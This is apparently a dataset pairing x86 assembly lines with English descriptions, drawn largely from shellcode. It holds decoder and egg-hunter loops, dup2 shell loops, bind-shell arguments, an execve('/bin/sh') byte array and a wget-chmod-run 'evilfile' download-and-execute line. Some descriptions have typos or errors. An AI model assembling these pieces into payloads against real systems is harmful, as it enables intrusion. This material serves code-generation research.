jmp eax	jump to eax
jmp eax	jump to the value stored in the eax register
jmp ecx	jump to ecx
jmp edi	jump to edi (our shellcode) if both eggs are found
jmp edi	jump to shellcode
jmp edi	go to edi
jmp edi	jump to edi
jmp edi	jump to the edi label
jmp edx	perfrom an unconditional jump to edx
jmp edx	jump to edx
jmp encodedshellcode	perform an unconditional jump to encodedshellcode_label
jmp encrypt	go to _encrypt label
jmp encrypt	jump to the encrypt label
jmp entrypoint	jump to _ entrypoint
jmp entrypoint	jump to the entrypoint label
jmp esp	go to esp address
jmp esp	jump to the esp label
jmp find_address	perform an unconditional jumo to _find_address label
jmp fupdisasm+1	jump to fupdisasm+1
jmp fupdisasm+1	jump to the address specified by the operation fupdisasm+1
jmp fupdisasm+3	jump to the address specified by the operation fupdisasm+3
jmp get_key	jumo to get_key label
jmp insertion_decoder	perform an unconditional jumo to insertion_decoder label
jmp jocker	go to _jocker label
jmp jocker	jump to the jocker label
jmp l20	jump to label l20
jmp loop	jump to the label loop
jmp multiplyloop	jump to label multiplyloop
jmp nextarg	jump to nextarg label
jmp nextchar	jump to the point in the code labeled nextchar
jmp one	jump to the one label
jmp read	perform an unconditional jump to _read label
jmp read	jump to the read label
jmp read	jump to the label read
jmp read	jump to label read
jmp read_file	perform an unconditional jump to read_file_label
jmp reading	go to _reading label
jmp reading	jump to the reading label
jmp shell	go to _shell label
jmp shell	jump to the shell label
jmp shellcode	perform an unconditional jumo to _shellcode label
jmp shellcode	jump to shellcode
jmp shellcode	jump to the shellcode label
jmp short _cmd	perform a short unconditional jump to _cmd label
jmp short _cmd	perform a short jmp to _cmd label
jmp short _cmd	jump short to the _cmd label
jmp short _execline	perform a short and unconditional jumo to _execline label
jmp short _execline	jump short to the _execline label
jmp short _file	perform a short unconditional jump to _file label
jmp short _file	perform a short unconditional jmp to _file label
jmp short _file	jump short to the _file label
jmp short _load_data	perform a short unconditional jumo to _load_data label
jmp short _load_data	jump short to the _load_data label
jmp short _load_data	jump short to _load_data label
jmp short _star	jump short to _star label
jmp short _start	jump short to the _start label
jmp short .exit	jump short to the .exit label
jmp short 0x11	jump short to 0x11
jmp short 0x2c	jump short to 0x2c
jmp short 0x34	jump short to 0x34
jmp short 0x63	jump short to 0x63
jmp short call_decoder	perform an unconditional short jump to _call_decoder label
jmp short call_decoder	perform a short unconditional jump to call_decoder_label
jmp short call_decoder	perform a short unconditional jump to call_decoder label
jmp short call_decoder	perform a short unconditonal jump to call_decoder
jmp short call_decoder	jump short to the call_decoder label
jmp short call_decoder	jump short to call_decoder
jmp short call_decoder	jump short to the function call_decoder
jmp short call_shellcode	perform an unconditional short jump to _call_shellcode label
jmp short call_shellcode	perform an unconditional short jump to call_shellcode_label
jmp short call_shellcode	perfrom a short unconditional jump to call_sh-ellcode label
jmp short call_shellcode	perform a short unconditional jump to call_shellcode label
jmp short call_shellcode	jump short to the function call_shellcode
jmp short call_shellcode	go to call_shellcode
jmp short call_shellcode	jump short to call_shellcode
jmp short call_shellcode	jump short to the call_shellcode label
jmp short call_write	perform an unconditional jump to _call_write label
jmp short call_write	jump short to the call_write label
jmp short callit	jump short to the callit label
jmp short callme	jump short to the callme label
jmp short cmd	perform an unconditional short jump to _cmd label
jmp short cmd	jump short to the cmd label
jmp short cycle	jump short to cycle
jmp short cycle	jump short to the cycle label
jmp short cycle	jump short to cycle label
jmp short decode	perform an unconditional short jump to _decode label
jmp short decode	perform a short jump to _decode label and repeat the decoding process for the next word!
jmp short decode	jump short to the label decode
jmp short decode	jump short to decode
jmp short decode	jump back to start of decode
jmp short decode	jump short to the function decode
jmp short decode	jump short to the decode label
jmp short decode_pr	goto the decode_pr to decode the next bytes
jmp short decode_pr	jump short to the decode_pr label
jmp short enc	perform a short jumo to enc_label
jmp short enc	jump short to the enc label
jmp short encodedshellcode	perform an unconditional short jump to _encodedshellcode label
jmp short end	perform a short unconditional jump to _end label
jmp short end	jump short to the end label
jmp short exi	jump short to exi label
jmp short fileaddress	perform a short unconditional jumo to fileaddress
jmp short fileaddress	jump short to the fileaddress label
jmp short formatting	jump short to the formatting label
jmp short four	perform a short unconditional jump to _four label
jmp short four	jump short to the four label
jmp short get	perform a short unconditional jump to get_label
jmp short get	jump short to the get label
jmp short get_shellcode_addr	jump short to get_shellcode_addr
jmp short gotocall	perform a short unconditional jumo to _gotocall label
jmp short gotocall	jump short to the gotocall label
jmp short here	jump short to the here label
jmp short inc_dec	perform a short unconditional jump to inc_dec label
jmp short inc_dec	jump short to inc_dec
jmp short inc_dec	jump short to the routine inc_dec
jmp short main	perform a short jump to main_label
jmp short main	jump short to the main label
jmp short main	jump short to main
jmp short output	perform a short unconditional jump to output label
jmp short output	jump short to the output label
jmp short path	jump short to the path label
jmp short process_shellcode	perform a short unconditional jump to process_shellcode
jmp short process_shellcode	jump short to the process_shellcode label
jmp short push_cmd	perform a short unconditional jump to push_cmd label
jmp short push_cmd	jump short to push_cmd
jmp short push_cmd	jump short to the push_cmd label
jmp short read	perform an unconditional short jump to read_label
jmp short read	perform an unconditional short jump to read label
jmp short read	jump short to the read label
jmp short rotate	perform an unconditional short jump to _rotate label
jmp short rotate	jump short to the rotate label
jmp short search	jump short to the search label
jmp short setup	perform an unconitional short jump to _setup label
jmp short setup	jump short to the setup label
jmp short shellcode	execute decoded shellcode
jmp short shellcode	perform a short unconditional jump to _shellcode label
jmp short shellcode	perform a short unconditional jump to _shellcode
jmp short shellcode	perform a short unconditional jump to shellcode
jmp short shellcode	jump short to the shellcode label
jmp short shellcode	jump short to shellcode
jmp short shellcode_section	go to shellcode_section
jmp short stage	perform a short unconditional jump to _stage label
jmp short stage	jump short to stage
jmp short stage	jump short to the stage label
jmp short switch	perform an unconditional short jump to _switch label
jmp short switch	jump short to switch
jmp short three	perform a short unconditional jump to _three label
jmp short three	jump short to the three label
jmp short todo	perform a short unconditional jump to todo_label
jmp short todo	jump short to the todo label
jmp short two	perform an unconditional short jump to two_label
jmp short two	perform a short unconditional jump to _two label
jmp short two	jump short to the two label
jmp two	perform an unconditional jump to _two label
jmp two	jump to two
jmp two	jump to the two label
jmp zero10	go to _zero10 label
jmp zero11	go to _zero11 label
jmp zero12	go to _zero12 label
jmp zero13	go to _zero13 label
jmp zero14	go to _zero14 label
jmp zero15	go to _zero15 label
jmp zero16	go to _zero16 label
jmp zero17	go to _zero17 label
jmp zero18	go to _zero18 label
jmp zero19	go to _zero19 label
jmp zero1a	go to _zero1a label
jmp zero1b	go to _zero1b label
jmp zero1c	go to _zero1c label
jmp zero1d	go to _zero1d label
jmp zero1e	go to _zerp1e label
jmp zero2	go to _zero2 label
jmp zero3	go to _zero3 label
jmp zero4	go to _zero4 label
jmp zero5	go to _zero5 label
jmp zero6	go to _zero6 label
jmp zero7	go to _zero7 label
jmp zero8	go to _zero8 label
jmp zero9	go to _zero9 label
jmp zeroa	go to _zeroa label
jmp zerob	go to _zerob label
jmp zeroc	go to _zeroc label
jmp zerod	go to _zerod label
jmp zeroe	go to _zeroe label
jmp zerof	go to _zerof label
jmp_search:	define the jmp_search label
jnc 0x86	jump to 0x86 if the carry flag is zero
jnc 0xd8	jump to 0xd8 it the carry flag is zero
jne _end+0x5f	if the zero flag is clear go to adress _end+0x5f
jne _nex	if not equal jump to the _nex label
jne _next	jump to the _next label if the operands of the above comparison are not equals
jne 804809a	jump to 804809a if not equal
jne 80480aa	jump to 80480aa if not equal
jne checkbuzz	if the remainder is not equal to zero jump to local label checkbuzz
jne checkint	if the remainder is not equal to zero jump to local label checkint
jne decode_insertion	if the zero flag is clear jump to decode insertion label
jne encoded	if the zero flag is clear jump to _encoded label
jne encodedshellcode	if the zero flag is clear go to _encodedshellcode label
jne loop	jump to the address specified by the label loop if the operands are not equals in the previous comparison
jne next_addr	jump to the next_addr label if the operands of the above comparison are not equals
jne nextnumber	if not equal jump to the label nextnumber
jne no_error	jump to the label no_error if not equal
jne retry	jump to retry if not equal
jne short _while_loop	if not equal jump short to the _while_loop
jne short _while_loop	jump to the _while_loop label if the operands of the above comparison are not equals
jno insertion_decoder+0xc	if the overflow flag is clear go to the adress insertion_decoder+0xc
jns _dup2_loop	as long as sf is not set, jump to _dup2_loop label
jns _dup2_loop	jump to the _dup2_loop label if the previous instruction clears the sign flag
jns 2f	jump to 2f if the sign flag is zero
jns 3f	jump to 3f if the sign flag is zero
jns decode_pr	jump to decode_pr if not signed
jns dup2	as long as sf iss not set, jump to _dup2 label
jns dup2	jump to dup2 if not negative
jns dup2	jump to the dup2 label if the previous instruction clears the sign flag
jns dup2loop	jump back to the dup2loop procedure until ecx equals 0.
jns duploop	as long as sf iss not set, jump to _duploop label
jns duploop	jump to duploop if not negative
jns duploop	jump to the duploop label if the previous instruction clears the sign flag
jns loop	jump to loop_label if the sign flag is clear
jns loop	if sf not set jump to _loop label
jns loop	jump to _loop label if the sign flag is clear
jns loop	if sf not set, ecx not negative so continue looping
jns loop	if ecx is not inferior to 0 go to _loop label
jns loop	as long as sf is not set, jump to _loop label
jns loop	jump to the loop label if the previous instruction clears the sign flag
jns loop_dup	jump to loop_dup label if the sign flag is clear
jns loop2	as long as sf is not set, jump to _loop2 label
jns loopinghere	loop as long sign flag is not set
jns loopinghere	jump to the loopinghere label if the previous instruction clears the sign flag
jnz _start	jump to the _start label if the zero flag is cleared
jnz 0x41	jump to 0x41 if not zero
jnz 0x8	jump to 0x8 if not zero
jnz 1	if not zero jump to numeric label 1
jnz 1	jump to the numeric label 1 if the zero flag is cleared
jnz decode	jump to _decode label if flag zero is equal to 0
jnz decode	jump to the decode label if the zero flag is cleared
jnz dup2	jump to dup2 if flag zero is equal to 0
jnz exeunt	jump to exeunt if not zero
jnz exit_on_error	jump to exit_on_error label if flag zero is equal to 0
jnz exit_on_error	jump to the exit_on_error label if the zero flag is cleared
jnz incaddr	if no match go to incaddr
jnz incaddr	jump to incaddr if not equal
jnz incaddr	jump to incaddr if no match
jnz l00p	jump to the l00p label if the zero flag is cleared
jnz loop	jump to loop_label if flag zero is equal to 0
jnz loop	go to _loop label if flag zero is not set
jnz loop	jump to loop if not equal to zero
jnz loop	jump to the loop label if the zero flag is cleared
jnz next_addr	jump to next_addr if not zero
jnz next_cycle	if not zero jump to the next_cycle label
jnz next_cycle	jump to the next_cycle label if the zero flag is cleared
jnz scan	if not 0 then jump to the scan label
jnz short _paren	if not zero jump short to the _paren label
jnz short _parent	jump short to the _parent label if the zero flag is cleared
jnz short decode	jump short to decode if not zero
jnz short decode	jump short to the decode label if the zero flag is cleared
jnz short loc_4010e5	if not zero jump to loc_4010e5
jnz stage	jump to the stage label if the zero flag is cleared
jnz top	if not 0 then jump to the top label
jocker:	define _jocker label
jocker:	declare the jocker label
js error	jump to error label if sign flag SF is equal to 1
jz _close	jump to the label _close if the zero flag is set
jz _read	jump to the label _read if the zero flag is set
jz _start	jump to the _start label if the zero flag is set
jz 0x8	jump to 0x8 if zero
jz call_decoded	jump to the call_decoded label if the zero flag is set
jz child	if zero jump to the child label
jz child	jump to child if zero
jz child	jump to label child if the zero flag is set
jz child	jump to the child label if the zero flag is set
jz decoded_shellcode	if zero jump to decoded_shellcode
jz decoded_shellcode	jump to decoded if zero
jz download	jump to download if zero
jz download	jump to the download label if the zero flag is set
jz encoded	if zero jump to the encoded label
jz encoded	jump to the encoded label if the zero flag is set
jz exit	jump to the exit label if the zero flag is set
jz find_egg	jump to find_egg if zero
jz find_egg	jump to the find_egg label if the zero flag is set
jz finished	jump to the point in the code labeled finished if zero
jz formatting	if zero jump to the formatting label
jz formatting	jump to the formatting label if the zero flag is set
jz incpage	skip page if it returned efault
jz incpage	jump to incpage if equal
jz next_cycle	if zero jump to the next_cycle label
jz next_cycle	jump to the next_cycle label if the zero flag is set
jz next_page	jump to next_page if zero
jz nomoreargs	if zero flag is set jump to nomoreargs label
jz shift_decode	if zero jump to the shift_decode label
jz shift_decode	jump to the shift_decode label if the zero flag is set
jz short loc_402b13	if 0 then jump to loc_402b13
key equ 0xdeadbeef	declare key variable euqal to the value 0xdeadbeef
key equ 0xdeadbeef	define key constant equal to 0xdeadbeef
l00p:	declare the l00p label
L1: \n call [esp]	in L1 call the stack
L1: \n jmp short esp	in L1 jump short to esp
L1: \n jmp short L2	define L1 label and jump short to L2
L2: \n call [esp]	declare L2 label and call the function pointed by the stack
L2: \n jmp L3	define L2 label and jump to L3 label
L2: \n jmp short esi	define L2 and jump short to esi
L3: \n call [esp]	declare L3 and jump to the shellcode
L3: \n jmp edi	define the label L3 and jump to edi
L3: \n jmp short L4	define L3 and jump short to L4 label
L4: \n call [esp]	declare L4 and jump to the shellcode
L4: \n jmp short esp	in L4 jump short to the stack pointer
L5: \n call [esp]	in L5 jump to the shellcode
L5: \n jmp esp	define the label L5 and jump to the location pointed by the stack pointer
lea bx, [bp+0x08]	load the effective address of the operation [bp+0x08] into the bx register
lea bx, [bp+0x0b]	load the effective address of the operation bp+0x0b] into the bx register
lea cx, [bp+di+0x32]	load the effective address of the operation [bp+di+0x32] into the cx register
lea dx, [bp+di+0x3e]	load the effective address of the operation [bp+di+0x3e] into the dx register
lea eax, [ebx+0xf]	load the address of the variable at the address ebx+0xfinto eax register
lea eax, [ebx+0xf]	load the effective address of the result of the operation [ebx+0xf] into the eax register
lea eax, [ebx+17h]	load the effective address of the result of the operation [ebx+17h] into the eax register
lea eax, [ebx+8]	put the address of ebx+8 into eax
lea eax, [ecx+0bh]	load the effective address of the result of the operation [ecx+0bh] into the eax register
lea eax, [ecx+4]	load the effective address of the result of the operation [ecx+4] into the eax register
lea eax, [esi]	point eax to the start of the shellcode
lea eax, [esi+1]	point eax to the next byte of the shellcode
lea eax, [val]	place the value val in eax
lea eax, [var]	place the address of var in eax
lea eax, [var]	place the value in var in eax
lea eax, [zero_reg+3]	load the effective address [zero_reg+3] into eax
lea eax, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the eax register
lea eax, [zero_reg+6]	load the effective address [zero_reg+6] into eax
lea eax, [zero_reg+6]	load the effective address of the result of the operation [zero_reg+6] into the eax register
lea eax, [zero_reg+66h]	load the effective address [zero_reg+66h] into eax
lea eax, [zero_reg+66h]	load the effective address of the result of the operation [zero_reg+66h] into the eax register
lea eax,[ebx+0xb]	load the effective address of the operation [ebx+0xb] into the eax register
lea ebp,[ebp+0x59]	load the effective address of the operation [ebp+0x59] into the ebp register
lea ebx, [ebp-8]	load the effective address [ebp-8] into ebx
lea ebx, [ebp-8]	load the effective address of ebp-8 into the ebx register
lea ebx, [ebp+24]	load the effective address [ebp+24] into ebx
lea ebx, [ebp+24]	load the effective address of the result of the operation [ebp+24] into the ebx register
lea ebx, [ebp+39]	load the effective address [ebp+39] into ebx
lea ebx, [ebp+39]	load the effective address of the result of the operation [ebp+39] into the ebx register
lea ebx, [edx+0x4]	copy the adress of the varable at location edx+0x4 into ebx register
lea ebx, [edx+0x4]	load the effective address of edx+0x4 into ebx
lea ebx, [esi]	put address of string -> ebx
lea ebx, [esi]	load the effective address of esi into the ebx register
lea ebx, [esi]	point ebx to the start of the shellcode
lea ebx, [esi+1]	point ebx to the next byte of the shellcode
lea ebx, [esi+13]	load the effective address of the result of the operation [esi+13] into the ebx register
lea ebx, [esi+14]	load address of -lvp1337 in ebx
lea ebx, [esi+14]	load the effective address of the result of the operation [esi+14] into the ebx register
lea ebx, [esi+15]	load the effective address [esi+15] into ebx
lea ebx, [esi+15]	load the effective address of the result of the operation [esi+15] into the ebx register
lea ebx, [esi+23]	load address of -e/bin/bash into ebx
lea ebx, [esi+23]	load the effective address of the result of the operation [esi+23] into the ebx register
lea ebx, [esp +1]	load the effective address [esp+1] into ebx
lea ebx, [esp +1]	load the effective address of the result of the operation [esp +1] into the ebx register
lea ebx, [esp]	load stack pointer to ebx
lea ebx, [esp]	save esp address into ebx register
lea ebx, [esp]	load the effective address of esp into ebx
lea ebx, [esp]	load the effective address of esp into the ebx register
lea ebx, [zero_reg+3]	load the effective address [zero_reg+3] into ebx
lea ebx, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the ebx register
lea ebx,[esi]	load the address of esi into ebx register
lea ecx, [eax]	copy the address of eax in ecx
lea ecx, [eax]	load the effective address of the result of the operation [eax] into the ecx register
lea ecx, [ebp+28]	load the effective address [ebp+28] into ecx
lea ecx, [ebp+28]	load the effective address of the result of the operation [ebp+28] into the ecx register
lea ecx, [ebx+0xff]	load the value of ebx+0xff into register ecx
lea ecx, [ebx+8]	load the effective address of ebx+8 into ecx
lea ecx, [esi + 8]	load the adress esi+8 into ecx register
lea ecx, [esi + 8]	load the effective address of the result of the operation [esi + 8] into the ecx register
lea ecx, [esi]	point ecx to the start of the shellcode
lea ecx, [esi+1]	point ecx to the next byte of the shellcode
lea ecx, [esi+18]	load the effective address [esi+18] into ecx
lea ecx, [esi+18]	load the effective address of the result of the operation [esi+18] into the ecx register
lea ecx, [esi+22]	load the effective address of the result of the operation [esi+22] into the ecx register
lea ecx, [esi+35]	load address of ptr to argv[] array into ecx register
lea ecx, [esi+35]	load the effective address of the result of the operation [esi+35] into the ecx register
lea ecx, [esi+8]	load the effective address of the result of the operation [esi+8] into the ecx register
lea ecx, [esp]	load stack pointer to ebx
lea ecx, [esp]	load esp address into ecx register
lea ecx, [esp]	load the effective address of esp into the ecx register
lea ecx, [zero_reg+117]	load the effective address [zero_reg+117] into ecx
lea ecx, [zero_reg+117]	load the effective address of the result of the operation [zero_reg+117] into the ecx register
lea ecx, [zero_reg+3]	load the effective address [zero_reg+3] into ecx
lea ecx, [zero_reg+3]	load the effective address of the result of the operation [zero_reg+3] into the ecx register
lea ecx,[esi+0xc]	load the address esi+0xc into ecx register
lea edi, [ebx]	load the effective address [ebx] into edi
lea edi, [ebx]	load the effective address of ebx into the edi register
lea edi, [ebx+4*esi]	place the value ebx+4*esi in edi
lea edi, [ebx+4*esi]	place the quantity ebx+4*esi in edi
lea edi, [edi + 2]	load the address of edi+2 into edi
lea edi, [edi +8]	make edi point to rot_value
lea edi, [esi + 13]	put the byte in the address esi+13 in edi regsiter.
lea edi, [esi + 13]	load the effective address of the result of the operation [esi + 13] into the edi register
lea edi, [esi + 13]	load the address at esi + 13 into edi
lea edi, [esi +1]	transfer the second character pointed from esi to edi
lea edi, [esi +1]	load the effective address of [esi + 1] into the edi register
lea edi, [esi]	copy the address of esi in edi
lea edi, [esi]	load the effective address [esi] into edi
lea edi, [esi]	load the address of esi into edi
lea edi, [esi]	point edi to the start of the shellcode
lea edi, [esi]	load the contents of esi into edi
lea edi, [esi+0x1]	load the address of esi+0x1 into edi
lea edi, [esi+1]	point edi to the next byte of the shellcode
lea edi, [esi+13]	load the effective address of esi+13 into esi+13
lea edi,[esi]	copy the address of esi into edi register
lea edi,[esi+0x1]	copy the adress a tesi+0x1 into edi register
lea edx, [ebx+12]	load the effective address of ebx+12 into edx
lea edx, [esi + 12]	load the adress esi+12 into edx register
lea edx, [esi + 12]	load the effective address of the result of the operation [esi + 12] into the edx register
lea edx, [esi]	point edx to the start of the shellcode
lea edx, [esi+1]	point edx to the next byte of the shellcode
lea edx, [esi+26]	load the effective address [esi+26] into edx
lea edx, [esi+26]	load the effective address of the result of the operation [esi+26] into the edx register
lea edx, [esi+30]	load the effective address of the result of the operation [esi+30] into the edx register
lea edx, [esi+47]	load address of ptr to envp[] null into edx register
lea edx, [esi+47]	load the effective address of the result of the operation [esi+47] into the edx register
lea edx,[esi+0x10]	load the address esi+0x10 into edx register
lea esi, [ebp+20]	load the effective address [ebp+20] into esi
lea esi, [ebp+20]	load the effective address of the result of the operation [ebp+20] into the esi register
lea esi, [edi + 8]	transfer the eighth character pointed by edi to esi
lea esi, [edi +16]	make esi register point to shellcode
lea esi, [edi +8]	make esi point to shellcode that contains previous xor’ed results
lea esi, [esi +4]	load the effective address of the result of the operation [esi +4] into the esi register
lea esi, [esi+2]	load the effective address of esi+2 into esi
lea esi, [esi+4]	load the effective address [esi+4] into esi
lea esp, [ebx]	load the value of register ebx into register esp
lea rdi, [rsp]	load the address of the string that is on the stack into rsi
len equ $ - msg	define len equal to the length of msg
len equ $-encodedshellcode	define len equal to the lenght of the encodedshellcode array
len: equ $-encodedshellcode	variable for the lenght of the encoded shellcode
len: equ $-google	"define len = size of db ""127.1.1.1 google.com"""
len: equ $-google	declare the len label equal to the size of the google variable
len: equ $-shellcode	define lenght of shellcode, len
len: equ $-shellcode	declare the len label equal to the length of shellcode
les esp,fword ptr [ebx]	loads 32-bit pointer from ebx to esp and fs regster
letter_c db 'c'	allocate a single byte of memory and initialize it to the letter 'c'
line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a	define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a
"line db ""/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile"", 0x0a"	"jump to the _exec label after entering the address of the string """"/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile"", 0x0a"" at the top of the stack"
loader:	define _loader
loader:	declare the loader label
lods al,byte ptr ds:[esi]	transfers string element addressed by esi regoster into al register
loop .3	decrement the counter and jump to .3 label if the count is not zero
loop 3	decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero
loop bucle	decrement the ecx register and jump to the bucle label if the counter is not zero
loop check_even_odd	loop check_even_odd using ecx for counter
loop check_even_odd	decrement the count register and jump to check_even_odd if the count is not equal to zero
loop check_even_odd \n jmp short shellcode	decrease the counter and jump to check_even_odd if not zero else jump short to shellcode
loop check_even_odd \n jmp short shellcode	decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decode	loop decode
loop decode	start loop decode
loop decode	loop deocde
loop decode	loop while zero flag not set
loop decode	decode current byte
loop decode	decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero
loop decode	decrement the count register and jump to decode if not equal zero
loop decode	decrease the counter and jump to decode if not zero
loop decode \n jmp edx	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register
loop decode \n jmp edx	decrement the counter and jump to decode if not zero else jump to edx
loop decode \n jmp EncodedShellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label
loop decode \n jmp encodedshellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the encodedshellcode label
loop decode \n jmp Shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label
loop decode \n jmp shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decode \n jmp shellcode	decrement the counter and jump to decode routine if it is not zero else jump to shellcode label
loop decode \n jmp short encodedshellcode	decrement the counter and jump to the decode label if it is not zero else jump short to the encodedshellcode label
loop decode \n jmp short shellcode	decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
loop decode \n jmp short shellcode	decrease the counter and jump to decode if not zero else jump short to shellcode
loop decode_loop \n jmp short encoded_shellcode	decrement the counter and if it is not zero go back at decode_loop and execute the cicle again else jump to encoded_shellcode
loop decrypt	decrement the count register and jump to _decrypt if not equal zero
loop decrypt	decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero
loop decrypt \n jmp encrypt	decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label
loop do_dup	decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero
loop do_dup	decrement the counter and jump to the do_dup label if the count is not zero
loop do_dup \n push byte 0x3f	decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack
loop eggLoop \n jmp edi	decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register
loop fill	decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero
loop fill	decrement the counter and jump to the fill label if the count is not zero
loop fill \n mov ecx, esp	decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
loop l1 \n mov eax, esp	decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register
loop l1 \n mov eax, esp	decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register
loop l2 \n jmp edi	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register
loop l2 \n mov ebx, esp	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
loop l2 \n mov ebx, esp	decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register
loop l3 \n mov ecx, esp	decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
loop l3 \n mov ecx, esp	decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register
loop l4 \n mov edx, esp	decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register
loop l4 \n mov edx, esp	decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register
loop main_inc	decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero
loop main_inc \n mov ebx, esp	decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
loop main_inc \n mov ebx, esp	decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register
loop main_loop	decrement the counter and jump to the main_loop label if the count is not zero
loop main_push	decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero
loop main_push \n mov cl, 30	decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register
loop rot_decode	loop 4 times
loop ROT_decode \n jmp short Shellcode	decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label
loop up	decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
loop xor_decode	loop 4 times
loop_dup:	define _loop_dup label
loop:	declare loop_label
loop:	define _loop_label
loop:	define _loop label
loop:	declare the loop label
loop:	define the loop label
loop2:	define _loop2 label
loopinghere:	define _ loopinghere label
loopinghere:	declare the loopinghere label
loopnz decode	decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero
loopnz L1	decrement the counter and jump to the L1 label if the count is not zero and the zero flag is equal to zero
loopnz L1 \n jmp shellcode	decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label
loopnz L2	decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero
loopnz L2 \n push eax	decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack
loopnz L3 \n mov edx, 7	decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register
loopnz Label1	decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero
loopnz next	decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero
loopnz next \n jmp ecx	decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register
loopnz next2 \n jmp edi	decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register
lowbound:	lowbound label
main_inc:	declare the main_inc label
main_inc:	create label main_inc
main_loop:	define main_loop label
main_push:	create label main_push
main_push:	declare the main_push label
main:	define main_label
main:	declare the main label
main:	main function
main:	create main label
main:	define main label
marks dw 0, 0, 0, 0	allocate memory for the marks array of words and initialize all elements to zero
matrix qw 12*10	allocate memory for a 12*10 quad-bytes matrix
me:	declare the me label
me:	define me label
message db '/bin/sh'	define message byte and initialize it to '/bin/sh'
message db '/bin/sh'	define message as the byte string '/bin/sh'
message db '/etc/passwd'	define the string message and initialize it to '/etc/passwd'
message db '/etc/passwd'	define message as the byte string '/etc/passwd'
message db 'hello',13,0	allocate memory for a null terminated string 'hello\n'
message:	declare message_label
message: db 'hello world!'	declare message to contain the bytes 'hello world!'
message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68	define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
mov [1000h], ax	move the value of ax into memory at address 1000h
mov [bp+0x07], al	move the contents of the al register at the memory location specified by the operation [bp+0x07]
mov [bp+0x0a], al	move the contents of the al register at the memory location specified by the operation [bp+0x0a]
mov [bp+0x31], al	move the contents of the al register at the memory location specified by the operation [bp+0x31]]
mov [bp+0x32], si	move the contents of the si register at the memory location specified by the operation [bp+0x32]
mov [bp+0x36], bx	move the contents of the bx register at the memory location specified by the operation [bp+0x36]
mov [bp+0x3a], bx	move the contents of the bx register at the memory location specified by the operation [bp+0x3a]
mov [bp+0x3e], ax	move the contents of the ax register at the memory location specified by the operation [bp+0x3e]
